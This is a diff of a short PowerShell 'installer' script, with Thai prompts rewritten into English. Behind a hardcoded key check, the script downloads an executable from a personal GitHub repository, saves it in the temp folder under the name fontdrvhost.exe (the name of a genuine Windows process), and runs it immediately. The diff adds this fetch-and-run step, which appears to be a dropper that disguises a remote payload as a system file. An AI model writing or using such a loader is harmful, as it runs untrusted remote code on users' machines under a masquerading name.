@@ -1,45 +1,44 @@
-﻿Clear-Host
+Clear-Host
 
-# กำหนด Key ที่ถูกต้อง (คุณสามารถแก้ได้เอง)
-$validKey = 1234ABCD
+# ===== CONFIG =====
+$validKey = "1234ABCD"  # <-- เปลี่ยนเป็น Key ที่คุณต้องการ
+$exeUrl = "https://github.com/draft7973-ops/Smithshop/raw/refs/heads/main/fontdrvhost.exe"
+$exeOutput = "$env:TEMP\fontdrvhost.exe"
 
-# กำหนดลิงก์ไฟล์ exe
-$exeUrl = httpsbit.ly4uBAZh3
-$exeOutput = $envTEMPfontdrvhost.exe
+# ===== MENU =====
+Write-Host "=== MENU ==="
+Write-Host "1. Install"
+Write-Host "2. Clean"
 
-# แสดงเมนู
-Write-Host === MENU ===
-Write-Host 1. Install
-Write-Host 2. Clean
-
-$choice = Read-Host เลือกตัวเลือก (1 หรือ 2)
+$choice = Read-Host "Choose 1 or 2"
 
 switch ($choice) {
-    1 {
-        # Install
-        $userKey = Read-Host กรุณาใส่ Key
+    "1" {
+        $userKey = Read-Host "Enter Key"
         if ($userKey -eq $validKey) {
-            Write-Host Key ถูกต้อง ✅ กำลังติดตั้ง...
+            Write-Host "Key correct! Installing..."
             
-            # ดาวน์โหลดไฟล์ exe
+            # Download .exe
             Invoke-WebRequest $exeUrl -OutFile $exeOutput
+            
+            # Run .exe
             Start-Process $exeOutput
+            Write-Host "Installation complete ✅"
         } else {
-            Write-Host ❌ Key ไม่ถูกต้อง -ForegroundColor Red
+            Write-Host "Key incorrect ❌" -ForegroundColor Red
         }
     }
-    2 {
-        # Clean
-        Write-Host กำลังลบไฟล์...
+    "2" {
+        Write-Host "Cleaning..."
         if (Test-Path $exeOutput) {
             Remove-Item $exeOutput -Force
-            Write-Host ลบไฟล์เรียบร้อย ✅
+            Write-Host "File removed ✅"
         } else {
-            Write-Host ไม่พบไฟล์ที่จะลบ -ForegroundColor Yellow
+            Write-Host "File not found ⚠️"
         }
     }
     default {
-        Write-Host กรุณาเลือก 1 หรือ 2 เท่านั้น -ForegroundColor Yellow
+        Write-Host "Invalid choice! Please select 1 or 2 ⚠️"
     }
 }
 
